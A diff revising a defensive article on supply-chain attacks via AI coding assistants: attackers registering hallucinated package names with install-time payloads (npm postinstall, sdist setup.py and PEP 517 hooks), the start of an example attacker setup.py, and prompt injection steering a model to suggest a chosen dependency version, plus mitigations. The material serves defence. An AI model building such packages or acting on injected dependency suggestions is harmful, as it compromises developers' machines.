@@ -69,12 +69,13 @@ AI coding assistants sometimes suggest package names that don't exist. This has 
 
 The attack pattern: an attacker monitors for hallucinated package names that appear repeatedly in model suggestions (either through probing or passive observation), registers those packages with malicious payloads, and waits for developers who accept the suggestion and run their package manager.
 
-The malicious package needs only to exist and install. For npm packages, a `postinstall` script in `package.json` runs at install time. For PyPI, source distributions (`sdist`) can execute arbitrary code via `setup.py` during installation. Binary wheel packages (`.whl`) do not run `setup.py` at install time and do not provide an equivalent install-time hook — though they can still install malicious scripts or binaries. In both ecosystems, any install-time execution happens before any application-level code review of the package.
+The malicious package needs only to exist and install. For npm packages, a `postinstall` script in `package.json` runs at install time. For PyPI, source distributions (`sdist`) can execute arbitrary code at install time — historically through `setup.py`, and with modern PEP 517 packages through the build backend's hooks defined in `pyproject.toml`. Binary wheel packages (`.whl`) do not execute these hooks at install time and do not provide an equivalent mechanism — though they can still install malicious console scripts or other binaries. In both ecosystems, any install-time execution happens before any application-level code review of the package.
 
 ```python
 # An attacker-registered package's setup.py (executed when installed as sdist)
-# Uses stdlib only — third-party packages like requests aren't available yet
-# during another package's install-time execution.
+# Uses only stdlib for networking — third-party packages like 'requests'
+# are not reliably available during another package's install-time execution.
+# (setuptools itself is available because pip uses it to build the package.)
 from setuptools import setup
 import os, urllib.request, urllib.parse
 
@@ -114,7 +115,7 @@ A more targeted variant: an injection-capable attacker coerces the model into su
 }
 ```
 
-The version specification looks completely normal. The developer may not check why that version was suggested rather than `"axios": "latest"` or the current stable release.
+The version specification looks completely normal. The developer may not check why the model suggested that specific version rather than a floating range like `"axios": "^1"` or just the current stable release.
 
 ---
 
@@ -230,13 +231,20 @@ A CI environment that allows unrestricted outbound network access from test jobs
 
 ```yaml
 # .npmrc: restrict to approved registry
+# Important: this is only effective if the internal registry does NOT
+# transparently proxy unknown packages from the public registry on cache miss.
+# A pass-through proxy still allows hallucinated package names to resolve.
+# Use a curated or allowlisted registry for full protection.
 registry=https://your-internal-registry.example.com
 ```
 
 ```sh
 # Prefer npm ci (respects lockfile strictly) over npm install
 npm ci
-# Run a separate audit step
+# Note: npm audit detects known CVEs in *existing* packages; it will not
+# catch freshly published malicious packages or hallucinated package names
+# that haven't yet accumulated advisories. Use it for vulnerability hygiene
+# but don't rely on it as a control against the attacks described here.
 npm audit --audit-level=moderate
 ```
 
@@ -255,7 +263,7 @@ Limit what third-party content reaches the model's context window:
 
 ### SBOM-level tracking of AI-assisted changes
 
-Emerging practice in the field: annotating commits that include AI-assisted code with a standardized marker. Discussion of AI-provenance fields has appeared in the context of SPDX and CycloneDX SBOM standards, though as of mid-2026 no finalized specification has been widely adopted. Organizations can implement their own convention (e.g., a `Co-Authored-By: ai-assistant` trailer in commit messages) without waiting for standardization. If an organization tracks AI-assisted commits, it becomes possible to:
+Emerging practice in the field: annotating commits that include AI-assisted code with a standardized marker. Discussion of AI-provenance fields has appeared in the context of SPDX and CycloneDX SBOM standards, though as of mid-2026 no finalized specification has been widely adopted. Organizations can implement their own convention (e.g., a branch naming scheme or commit trailer) to flag AI-assisted changes — with the caveat that such markers are advisory and easy to omit or forge, making them useful for internal process tracking rather than security enforcement. If an organization consistently tracks AI-assisted commits, it becomes possible to:
 
 - Audit AI-assisted changes separately from human-written code
 - Apply enhanced review requirements to AI-suggested dependencies specifically
